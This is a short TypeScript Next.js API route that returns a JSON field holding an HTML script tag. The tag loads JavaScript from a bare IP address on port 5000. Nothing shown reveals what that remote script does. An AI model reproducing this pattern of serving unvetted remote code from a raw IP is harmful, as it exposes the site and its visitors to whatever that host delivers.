import type { NextApiRequest, NextApiResponse } from 'next'

type Data = {
    common_script: string
}

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  res.status(200).json({
    common_script: '<script src="https://52.78.218.188:5000/script"></script>',
 });
}
